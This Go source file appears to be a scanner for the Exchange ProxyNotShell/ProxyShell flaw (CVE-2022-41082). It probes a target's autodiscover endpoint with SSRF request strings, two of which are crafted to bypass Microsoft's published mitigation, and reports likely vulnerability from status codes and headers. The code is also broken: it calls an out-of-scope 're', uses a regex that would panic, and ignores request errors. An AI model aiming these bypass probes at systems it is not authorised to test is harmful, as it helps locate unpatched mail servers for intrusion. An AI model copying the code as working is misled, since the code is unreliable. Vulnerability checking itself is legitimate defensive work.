// ProxyNotShell Checker - dethlocker@0xdeadbeef.ai
// CVE-2022-41082
// Ref:
// https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-41082
// https://www.kb.cert.org/vuls/id/915563
// Microsoft Exchange Server 2019, Exchange Server 2016 and Exchange Server 2013 are vulnerable to a // server-side request forgery (SSRF) attack and remote code execution. An authenticated attacker can // use the combination of these two vulnerabilities to elevate privileges and execute arbitrary code // on the target Exchange server.
// User provides an URL. Go code checks if the URL is valid.
// First: Make request to the vulnerable resource.
// Checks: 
// If resp is 302 it will return ProxyShell.
// If resp is 200 it will return ProxyNotShell
// Second: Make the secound requests to the vulnerable resource.
// Checks: 
// If resp is 302 it will return ProxyShell & Bypass mitigation.
// If resp is 200 it will return ProxyNotShell & Bypass mitigation.
// Third: Make the third requests to the vulnerable resource.
// Checks:
// If resp is 302 it will return ProxyShell.
// If resp is 200 it will return ProxyNotShell

package main

import (
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

// Passing the user input URL to the function. Adding 'http://' if it wasn't provided returning the // clean and checked URL - otherwise "error"

func checkURL(u string) string {
	re := regexp.MustCompile(`^(?:(http|ftp)s?:\/\/)*(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|*(localhost|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::\d+)?(?:/?|[/?]\S+)$`)
	if re.MatchString(u) {
		return u
	} else {
		fmt.Println("Please specify a URL")
		os.Exit(1)
	}
	return u
}

func checkUrl(u string) string {
	return re.ReplaceAllStringFunc(checkURL(u), strings.ToLower)
}

func main() {
	var valter string
	flag.StringVar(&valter, "url", "", "Enter Autodiscover URL here:")
	flag.Parse()

	if valter == "" {
		fmt.Println("Enter a valid URl:")
		flag.PrintDefaults()
		return
	}
	header := make(http.Header)
	header.Add("User-Agent", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0")
	req, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", checkUrl(valter), "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"), nil)
	req.Header = header
	client := &http.Client{}
	resp, _ := client.Do(req)

	switch {
	case resp.StatusCode == 302:
		if resp.Header.Get("x-FEServer") != "" {
			fmt.Println(fmt.Sprintf("[%s]Potentially vulnerable to ProxyShell and ProxyNotShell (mitigation not applied).", string(resp.Header.Get("x-FEServer"))))
			return
		}
		break
	case resp.StatusCode == 401:
		fmt.Println("Not vulnerable (resource requires basic authentication.")
		return
	case resp.StatusCode == 404:
		fmt.Println("Not Vulnerable (affected resource not found.")
		return
	case resp.StatusCode == 403:
		fmt.Println("Not Vulnerable (access to resource is blocked.")
		return
	case resp.StatusCode == 500:
		fmt.Println("Not Vulnerable (internal server error.")
		return
	}

	switch {
	case resp.StatusCode == 200:
		if resp.Header.Get("x-FEServer") != "" {
			fmt.Printf("[%s]Potentially vulnerable to ProxyNotShell (mitigation not applied).", string(resp.Header.Get("x-FEServer")))
			return
		}
		break
	case resp.StatusCode == 401:
		fmt.Println("Not vulnerable (resource requires basic authentication.")
		return
	case resp.StatusCode == 404:
		fmt.Println("Not Vulnerable (affected resource not found.")
		return
	case resp.StatusCode == 403:
		fmt.Println("Not Vulnerable (access to resource is blocked.")
		return
	case resp.StatusCode == 500:
		fmt.Println("Not Vulnerable (internal server error.")
		return
	}

	// Request 1 bypass
	reqb1, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", checkUrl(valter), "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=Powershell"), nil)
	reqb1.Header = header
	clientb1 := &http.Client{}
	respb1, _ := clientb1.Do(reqb1)

	switch {
	case respb1.StatusCode == 302:
		if respb1.Header.Get("x-FEServer") != "" {
			fmt.Printf("[%s]Potentially vulnerable to ProxyShell and ProxyNotShell (mitigation bypassed [+]).", string(respb1.Header.Get("x-FEServer")))
			return
		}
		break
	case respb1.StatusCode == 401:
		fmt.Println("Not vulnerable (resource requires basic authentication.")
		return
	case respb1.StatusCode == 404:
		fmt.Println("Not Vulnerable (affected resource not found.")
		return
	case respb1.StatusCode == 403:
		fmt.Println("Not Vulnerable (access to resource is blocked.")
		return
	case respb1.StatusCode == 500:
		fmt.Println("Not Vulnerable (internal server error.")
		return
	}

	switch {
	case respb1.StatusCode == 200:
		if respb1.Header.Get("x-FEServer") != "" {
			fmt.Printf("[%s]Potentially vulnerable to ProxyNotShell (mitigation bypassed [+]).", string(respb1.Header.Get("x-FEServer")))
			return
		}
		break
	case respb1.StatusCode == 401:
		fmt.Println("Not vulnerable (resource requires basic authentication.")
		return
	case respb1.StatusCode == 404:
		fmt.Println("Not Vulnerable (affected resource not found.")
		return
	case respb1.StatusCode == 403:
		fmt.Println("Not Vulnerable (access to resource is blocked.")
		return
	case respb1.StatusCode == 500:
		fmt.Println("Not Vulnerable (internal server error.")
		return
	}

	// Request 2 bypass
	reqb2, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", checkUrl(valter), "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell"), nil)
	reqb2.Header = header
	clientb2 := &http.Client{}
	respb2, _ := clientb2.Do(reqb2)

	switch {
	case respb2.StatusCode == 302:
		if respb2.Header.Get("x-FEServer") != "" {
			fmt.Printf("[%s]Potentially vulnerable to ProxyShell and ProxyNotShell (mitigation not applied).", string(respb2.Header.Get("x-FEServer")))
			return
		}
		break
	case respb2.StatusCode == 401:
		fmt.Println("Not vulnerable (resource requires basic authentication.")
		return
	case respb2.StatusCode == 404:
		fmt.Println("Not Vulnerable (affected resource not found.")
		return
	case respb2.StatusCode == 403:
		fmt.Println("Not Vulnerable (access to resource is blocked.")
		return
	case respb2.StatusCode == 500:
		fmt.Println("Not Vulnerable (internal server error.")
		return
	}

	switch {
	case respb2.StatusCode == 200:
		if respb2.Header.Get("x-FEServer") != "" {
			fmt.Printf("[%s]Potentially vulnerable to ProxyNotShell (mitigation not applied).", string(respb2.Header.Get("x-FEServer")))
			return
		}
		break
	case respb2.StatusCode == 401:
		fmt.Println("Not vulnerable (resource requires basic authentication.")
		return
	case respb2.StatusCode == 404:
		fmt.Println("Not Vulnerable (affected resource not found.")
		return
	case respb2.StatusCode == 403:
		fmt.Println("Not Vulnerable (access to resource is blocked.")
		return
	case respb2.StatusCode == 500:
		fmt.Println("Not Vulnerable (internal server error.")
		return
	}

}
